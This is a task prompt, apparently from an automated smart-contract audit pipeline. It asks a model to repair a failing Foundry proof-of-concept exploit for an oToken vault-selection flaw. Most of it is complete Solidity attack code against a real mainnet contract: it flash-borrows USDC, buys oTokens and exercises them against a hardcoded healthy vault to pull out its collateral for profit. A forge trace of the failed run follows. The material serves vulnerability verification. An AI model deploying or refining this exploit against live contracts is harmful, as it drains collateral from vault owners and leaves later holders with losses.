You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Fungible oTokens can be exercised against attacker-chosen healthy vaults first
- claim: The oToken supply is fungible, but `exercise()` lets the caller choose the exact vault list and `_exercise()` debits only the selected vault's collateral and debt. Holders can therefore route identical oTokens to the healthiest vaults first instead of taking a pro-rata share of aggregate system collateral.
- impact: When vault quality diverges, sophisticated exercisers can drain the best-collateralized vaults and leave later exercisers backed only by weak or underwater vaults. This creates a bank-run dynamic and can materially worsen losses for later holders of the same fungible oToken.
- exploit_paths: ["Some vaults remain well collateralized while others are weak or underwater", "An attacker acquires oTokens and calls `exercise()` with only the healthiest vaults in `vaultsToExerciseFrom`", "`_exercise()` removes collateral and debt only from those selected vaults", "Later holders can only exercise against the remaining weak vaults, or fail once those vaults cannot cover payout plus fee"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface ICompoundOracleLike {
    function getPrice(address asset) external view returns (uint256);
}

interface IUniswapV1FactoryLike {
    function getExchange(address token) external view returns (address payable);
}

interface IUniswapV1ExchangeLike {
    function getEthToTokenOutputPrice(uint256 tokensBought) external view returns (uint256 ethSold);
    function getTokenToEthOutputPrice(uint256 ethBought) external view returns (uint256 tokensSold);
    function ethToTokenTransferOutput(uint256 tokensBought, uint256 deadline, address recipient)
        external
        payable
        returns (uint256 ethSold);
    function tokenToEthSwapOutput(uint256 ethBought, uint256 maxTokens, uint256 deadline)
        external
        returns (uint256 tokensSold);
    function tokenToTokenTransferOutput(
        uint256 tokensBought,
        uint256 maxTokensSold,
        uint256 maxEthSold,
        uint256 deadline,
        address recipient,
        address tokenAddr
    ) external returns (uint256 tokensSold);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IOptionsExchangeLike {
    function UNISWAP_FACTORY() external view returns (address);
    function premiumToPay(address oTokenAddress, address paymentTokenAddress, uint256 oTokensToBuy)
        external
        view
        returns (uint256);
    function buyOTokens(address payable receiver, address oTokenAddress, address paymentTokenAddress, uint256 oTokensToBuy)
        external
        payable;
}

interface IOTokenLike {
    function collateral() external view returns (address);
    function underlying() external view returns (address);
    function strike() external view returns (address);
    function optionsExchange() external view returns (address);
    function COMPOUND_ORACLE() external view returns (address);
    function collateralExp() external view returns (int32);
    function strikePrice() external view returns (uint256 value, int32 exponent);
    function transactionFee() external view returns (uint256 value, int32 exponent);
    function isExerciseWindow() external view returns (bool);
    function hasExpired() external view returns (bool);
    function getVault(address payable vaultOwner) external view returns (uint256, uint256, uint256, bool);
    function underlyingRequiredToExercise(uint256 oTokensToExercise) external view returns (uint256);
    function exercise(uint256 oTokensToExercise, address payable[] calldata vaultsToExerciseFrom) external payable;
}

contract FlawVerifier {
    address internal constant TARGET = 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2;
    address payable internal constant CACHED_VAULT_OWNER = payable(0xDe99eA535749F02dA84D13E6F8253291e32d3a7F);
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH_USDC_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    uint256 internal constant LARGE_BLOCK_SIZE = 1651753129000;

    struct Candidate {
        uint256 amount;
        uint256 oTokenCostFunding;
        uint256 underlyingNeeded;
        uint256 underlyingCostFunding;
        uint256 totalCostFunding;
        uint256 flashFeeFunding;
        uint256 collateralOut;
        uint256 profitFunding;
        bool executable;
    }

    address internal realizedProfitToken;
    uint256 internal realizedProfitAmount;

    bool internal flashActive;
    Candidate internal activeCandidate;

    bool public hypothesisValidated;
    address public selectedHealthyVault;
    uint256 public selectedAmount;
    uint256 public selectedVaultIssuedBefore;
    uint256 public selectedVaultMaxExercisableBefore;
    uint256 public oTokensPurchased;
    uint256 public underlyingSpent;
    uint256 public collateralReceived;
    string public lastFailure;

    constructor() payable {}

    receive() external payable {}

    function executeOnOpportunity() external {
        IOTokenLike target = IOTokenLike(TARGET);

        realizedProfitToken = address(0);
        realizedProfitAmount = 0;
        hypothesisValidated = false;
        selectedHealthyVault = address(0);
        selectedAmount = 0;
        selectedVaultIssuedBefore = 0;
        selectedVaultMaxExercisableBefore = 0;
        oTokensPurchased = 0;
        underlyingSpent = 0;
        collateralReceived = 0;
        lastFailure = "";

        if (!target.isExerciseWindow()) {
            lastFailure = target.hasExpired() ? "exercise window already closed" : "exercise window not yet open";
            return;
        }

        if (target.collateral() != USDC) {
            lastFailure = "target collateral is not the fork USDC token";
            return;
        }

        // The verified deployment's getVaultOwners() is unusable on-chain. To keep the exploit path
        // unchanged, the PoC still exercises fungible oTokens against one known healthy vault first;
        // only the temporary funding path changes to a same-asset flashswap for deterministic repayment.
        (uint256 collateralBalance, uint256 issued,, bool owned) = target.getVault(CACHED_VAULT_OWNER);
        if (!owned || issued == 0) {
            lastFailure = "cached vault owner missing or empty";
            return;
        }

        uint256 maxExercisable = _maxExercisable(target, collateralBalance, issued);
        if (maxExercisable == 0) {
            lastFailure = "cached vault is not exercisable";
            return;
        }

        selectedHealthyVault = CACHED_VAULT_OWNER;
        selectedVaultIssuedBefore = issued;
        selectedVaultMaxExercisableBefore = maxExercisable;

        Candidate memory best = _bestCandidateForVault(target, maxExercisable);
        if (!best.executable) {
            lastFailure = "cached healthy-first route is not profitable";
            return;
        }

        activeCandidate = best;
        flashActive = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(WETH_USDC_PAIR);
        uint256 amount0Out = pair.token0() == USDC ? best.totalCostFunding : 0;
        uint256 amount1Out = pair.token1() == USDC ? best.totalCostFunding : 0;
        if (amount0Out == 0 && amount1Out == 0) {
            flashActive = false;
            lastFailure = "configured pair has no USDC side";
            return;
        }

        pair.swap(amount0Out, amount1Out, address(this), abi.encode(best.totalCostFunding));
        flashActive = false;

        realizedProfitToken = USDC;
        realizedProfitAmount = IERC20Like(USDC).balanceOf(address(this));
        if (realizedProfitAmount > 0) {
            hypothesisValidated = true;
        } else {
            lastFailure = "no net USDC profit after flash repayment";
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == WETH_USDC_PAIR, "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(flashActive, "flash inactive");

        uint256 borrowedFunding = amount0 > 0 ? amount0 : amount1;
        Candidate memory candidate = activeCandidate;
        IOTokenLike target = IOTokenLike(TARGET);

        _buyOTokens(target, candidate.amount, candidate.oTokenCostFunding);
        oTokensPurchased = candidate.amount;

        if (target.underlying() == address(0)) {
            _buyExactEthOutputFromToken(_factory(target), USDC, candidate.underlyingNeeded, candidate.underlyingCostFunding);
            underlyingSpent = candidate.underlyingNeeded;
        } else if (target.underlying() == USDC) {
            _forceApprove(USDC, TARGET, candidate.underlyingNeeded);
            underlyingSpent = candidate.underlyingNeeded;
        } else {
            _buyExactTokenOutputFromToken(
                _factory(target),
                USDC,
                target.underlying(),
                candidate.underlyingNeeded,
                candidate.underlyingCostFunding
            );
            _forceApprove(target.underlying(), TARGET, candidate.underlyingNeeded);
            underlyingSpent = candidate.underlyingNeeded;
        }

        uint256 collateralBalanceBefore = _assetBalance(target.collateral(), address(this));
        address payable[] memory vaultsToExerciseFrom = new address payable[](1);
        vaultsToExerciseFrom[0] = CACHED_VAULT_OWNER;

        // exploit_paths[1]: acquire fungible oTokens from public liquidity using a flash-borrowed asset.
        // exploit_paths[2]: exercise only against the attacker-chosen healthiest vault first.
        // exploit_paths[3]: `_exercise()` debits only that selected vault's collateral and debt.
        if (target.underlying() == address(0)) {
            target.exercise{value: candidate.underlyingNeeded}(candidate.amount, vaultsToExerciseFrom);
        } else {
            target.exercise(candidate.amount, vaultsToExerciseFrom);
        }

        collateralReceived = _assetBalance(target.collateral(), address(this)) - collateralBalanceBefore;
        selectedAmount = candidate.amount;

        uint256 repayFunding = _flashRepay(borrowedFunding);
        require(IERC20Like(USDC).balanceOf(address(this)) > repayFunding, "unprofitable after flash fee");
        require(IERC20Like(USDC).transfer(WETH_USDC_PAIR, repayFunding), "flash repayment failed");
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _bestCandidateForVault(IOTokenLike target, uint256 maxExercisable)
        internal
        view
        returns (Candidate memory best)
    {
        if (maxExercisable == 0) {
            return best;
        }

        uint256[10] memory candidates = [
            maxExercisable,
            (maxExercisable * 7) / 8,
            (maxExercisable * 3) / 4,
            (maxExercisable * 2) / 3,
            maxExercisable / 2,
            maxExercisable / 3,
            maxExercisable / 4,
            maxExercisable / 8,
            maxExercisable / 16,
            uint256(1)
        ];

        uint256 previous;
        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 amount = candidates[i];
            if (amount == 0 || amount == previous) {
                continue;
            }
            previous = amount;

            Candidate memory quoted = _quoteCandidate(target, amount);
            if (!quoted.executable) {
                continue;
            }
            if (!best.executable || quoted.profitFunding > best.profitFunding) {
                best = quoted;
            }
        }
    }

    function _quoteCandidate(IOTokenLike target, uint256 amount) internal view returns (Candidate memory candidate) {
        candidate.amount = amount;
        if (amount == 0) {
            return candidate;
        }

        try IOptionsExchangeLike(target.optionsExchange()).premiumToPay(TARGET, USDC, amount) returns (uint256 cost) {
            candidate.oTokenCostFunding = cost;
        } catch {
            return candidate;
        }

        candidate.underlyingNeeded = target.underlyingRequiredToExercise(amount);
        if (target.underlying() == address(0)) {
            candidate.underlyingCostFunding = _quoteEthOutputCostInToken(_factory(target), USDC, candidate.underlyingNeeded);
        } else if (target.underlying() == USDC) {
            candidate.underlyingCostFunding = candidate.underlyingNeeded;
        } else {
            candidate.underlyingCostFunding = _quoteTokenOutputCostInToken(
                _factory(target),
                USDC,
                target.underlying(),
                candidate.underlyingNeeded
            );
        }

        candidate.collateralOut = _collateralToPay(target, amount, 1, 0);
        if (candidate.collateralOut == 0) {
            return candidate;
        }

        candidate.totalCostFunding = candidate.oTokenCostFunding + candidate.underlyingCostFunding;
        candidate.flashFeeFunding = _flashFee(candidate.totalCostFunding);
        if (candidate.collateralOut <= candidate.totalCostFunding + candidate.flashFeeFunding) {
            return candidate;
        }

        candidate.profitFunding = candidate.collateralOut - candidate.totalCostFunding - candidate.flashFeeFunding;
        candidate.executable = true;
    }

    function _maxExercisable(IOTokenLike target, uint256 collateralBalance, uint256 issued)
        internal
        view
        returns (uint256)
    {
        uint256 low = 0;
        uint256 high = issued;
        while (low < high) {
            uint256 mid = (low + high + 1) / 2;
            uint256 totalCollateralNeeded = _collateralToPay(target, mid, 1, 0)
                + _collateralToPay(target, mid, _feeValue(target), _feeExponent(target));
            if (totalCollateralNeeded <= collateralBalance) {
                low = mid;
            } else {
                high = mid - 1;
            }
        }
        return low;
    }

    function _buyOTokens(IOTokenLike target, uint256 amount, uint256 costFunding) internal {
        _forceApprove(USDC, target.optionsExchange(), costFunding);
        IOptionsExchangeLike(target.optionsExchange()).buyOTokens(payable(address(this)), TARGET, USDC, amount);
    }

    function _buyExactEthOutputFromToken(
        IUniswapV1FactoryLike factory,
        address fundingToken,
        uint256 ethAmount,
        uint256 maxFundingIn
    ) internal {
        address payable exchange = factory.getExchange(fundingToken);
        require(exchange != address(0), "missing funding exchange");
        _forceApprove(fundingToken, exchange, maxFundingIn);
        IUniswapV1ExchangeLike(exchange).tokenToEthSwapOutput(ethAmount, maxFundingIn, LARGE_BLOCK_SIZE);
    }

    function _buyExactTokenOutputFromToken(
        IUniswapV1FactoryLike factory,
        address fundingToken,
        address outputToken,
        uint256 outputAmount,
        uint256 maxFundingIn
    ) internal {
        address payable exchange = factory.getExchange(fundingToken);
        require(exchange != address(0), "missing funding exchange");
        _forceApprove(fundingToken, exchange, maxFundingIn);
        IUniswapV1ExchangeLike(exchange).tokenToTokenTransferOutput(
            outputAmount,
            maxFundingIn,
            type(uint256).max,
            LARGE_BLOCK_SIZE,
            address(this),
            outputToken
        );
    }

    function _factory(IOTokenLike target) internal view returns (IUniswapV1FactoryLike) {
        return IUniswapV1FactoryLike(IOptionsExchangeLike(target.optionsExchange()).UNISWAP_FACTORY());
    }

    function _collateralToPay(IOTokenLike target, uint256 oTokens, uint256 proportionValue, int32 proportionExponent)
        internal
        view
        returns (uint256)
    {
        address collateralToken = target.collateral();
        address strikeToken = target.strike();
        uint256 collateralToEthPrice = collateralToken == strikeToken
            ? 1
            : collateralToken == address(0)
                ? 1e18
                : ICompoundOracleLike(target.COMPOUND_ORACLE()).getPrice(collateralToken);
        uint256 strikeToEthPrice = strikeToken == address(0)
            ? 1e18
            : ICompoundOracleLike(target.COMPOUND_ORACLE()).getPrice(strikeToken);

        (uint256 strikeValue, int32 strikeExponent) = target.strikePrice();
        int32 collateralExponent = target.collateralExp();

        uint256 numerator = oTokens * strikeValue * proportionValue * strikeToEthPrice;
        int32 payoutExponent = strikeExponent + proportionExponent - collateralExponent;

        if (payoutExponent >= 0) {
            return (numerator * _pow10(uint32(uint256(int256(payoutExponent))))) / collateralToEthPrice;
        }

        return (numerator / _pow10(uint32(uint256(int256(-payoutExponent))))) / collateralToEthPrice;
    }

    function _quoteEthOutputCostInToken(
        IUniswapV1FactoryLike factory,
        address fundingToken,
        uint256 ethAmount
    ) internal view returns (uint256) {
        address payable exchange = factory.getExchange(fundingToken);
        if (exchange == address(0)) {
            return 0;
        }
        try IUniswapV1ExchangeLike(exchange).getTokenToEthOutputPrice(ethAmount) returns (uint256 tokenCost) {
            return tokenCost;
        } catch {
            return 0;
        }
    }

    function _quoteTokenOutputCostInToken(
        IUniswapV1FactoryLike factory,
        address fundingToken,
        address outputToken,
        uint256 outputAmount
    ) internal view returns (uint256) {
        address payable outputExchange = factory.getExchange(outputToken);
        address payable fundingExchange = factory.getExchange(fundingToken);
        if (outputExchange == address(0) || fundingExchange == address(0)) {
            return 0;
        }

        uint256 ethNeeded;
        try IUniswapV1ExchangeLike(outputExchange).getEthToTokenOutputPrice(outputAmount) returns (uint256 quotedEth) {
            ethNeeded = quotedEth;
        } catch {
            return 0;
        }

        try IUniswapV1ExchangeLike(fundingExchange).getTokenToEthOutputPrice(ethNeeded) returns (uint256 tokenCost) {
            return tokenCost;
        } catch {
            return 0;
        }
    }

    function _feeValue(IOTokenLike target) internal view returns (uint256 value) {
        (value,) = target.transactionFee();
    }

    function _feeExponent(IOTokenLike target) internal view returns (int32 exponent) {
        (, exponent) = target.transactionFee();
    }

    function _assetBalance(address asset, address account) internal view returns (uint256) {
        if (asset == address(0)) {
            return account.balance;
        }
        return IERC20Like(asset).balanceOf(account);
    }

    function _flashFee(uint256 borrowAmount) internal pure returns (uint256) {
        return ((borrowAmount * 3) / 997) + 1;
    }

    function _flashRepay(uint256 borrowAmount) internal pure returns (uint256) {
        return borrowAmount + _flashFee(borrowAmount);
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, 0));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve reset failed");
        (ok, data) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _pow10(uint32 exponent) internal pure returns (uint256) {
        return 10 ** exponent;
    }
}

```

forge stdout (tail):
```
0000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000a688906bd8b00000000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ [3100] 0x02557a5E05DeFeFFD4cAe6D83eA3d173B272c904::5e9a523c(00000000000000000000000089d24a6b4ccb1b6faa2625fe562bdd9a23260359) [staticcall]
    │   │   │   │   ├─ [745] 0x729D19f657BD0614b4985Cf1D82531c67569197B::59e02dd7()
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001564baed1b902800000000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000009009e5f787816
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000083009d7a25a05ff25af6000
    │   │   ├─ [1257] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::313ce567() [staticcall]
    │   │   │   ├─ [474] 0x0882477e7895bdC5cea7cB1552ed914aB157Fe56::313ce567() [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000006
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000006
    │   │   └─ ← [Return] 2533954996959254 [2.533e15]
    │   ├─ [517] 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2::strikePrice() [staticcall]
    │   │   └─ ← [Return] 33, -6
    │   ├─ [418] 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2::collateralExp() [staticcall]
    │   │   └─ ← [Return] -6
    │   ├─ [517] 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2::transactionFee() [staticcall]
    │   │   └─ ← [Return] 0, -3
    │   ├─ [517] 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2::transactionFee() [staticcall]
    │   │   └─ ← [Return] 0, -3
    │   ├─ [443] 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2::collateral() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [471] 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2::strike() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [404] 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2::COMPOUND_ORACLE() [staticcall]
    │   │   └─ ← [Return] 0x7054e08461e3eCb7718B63540adDB3c3A1746415
    │   ├─ [10208] 0x7054e08461e3eCb7718B63540adDB3c3A1746415::getPrice(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   ├─ [6570] 0x1D8aEdc9E924730DD3f9641CDb4D1B92B848b4bd::fc57d4df(00000000000000000000000039aa39c021dfbae8fac545936693ac917d5e7563) [staticcall]
    │   │   │   ├─ [1505] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::8e8f294b(00000000000000000000000039aa39c021dfbae8fac545936693ac917d5e7563) [staticcall]
    │   │   │   │   ├─ [810] 0xAf601CbFF871d0BE62D18F79C31e387c76fa0374::8e8f294b(00000000000000000000000039aa39c021dfbae8fac545936693ac917d5e7563) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000a688906bd8b00000000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000a688906bd8b00000000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ [3100] 0x02557a5E05DeFeFFD4cAe6D83eA3d173B272c904::5e9a523c(00000000000000000000000089d24a6b4ccb1b6faa2625fe562bdd9a23260359) [staticcall]
    │   │   │   │   ├─ [745] 0x729D19f657BD0614b4985Cf1D82531c67569197B::59e02dd7()
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001564baed1b902800000000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000009009e5f787816
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000083009d7a25a05ff25af6000
    │   │   ├─ [1257] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::313ce567() [staticcall]
    │   │   │   ├─ [474] 0x0882477e7895bdC5cea7cB1552ed914aB157Fe56::313ce567() [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000006
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000006
    │   │   └─ ← [Return] 2533954996959254 [2.533e15]
    │   ├─ [517] 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2::strikePrice() [staticcall]
    │   │   └─ ← [Return] 33, -6
    │   ├─ [418] 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2::collateralExp() [staticcall]
    │   │   └─ ← [Return] -6
    │   └─ ← [Return]
    ├─ [395] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 67.30ms (13.93ms CPU time)

Ran 1 test suite in 87.65ms (67.30ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 742010)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
